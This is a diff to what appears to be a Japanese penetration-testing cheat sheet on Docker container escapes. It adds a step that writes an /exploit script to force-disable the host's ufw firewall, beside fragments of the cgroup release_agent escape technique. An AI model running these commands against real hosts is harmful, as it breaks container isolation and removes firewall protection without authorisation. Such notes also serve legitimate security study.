@@ -292,6 +292,14 @@ chmod a+x /exploit
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
+FWが有効で、ufw 無効化が必要な場合がある
+
+```sh
+echo '#!/bin/sh' > /exploit
+echo "ufw --force disable" >> /exploit
+...
+```
+
 https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.
 
 ### 公開された Docker デーモンによるエスケープ
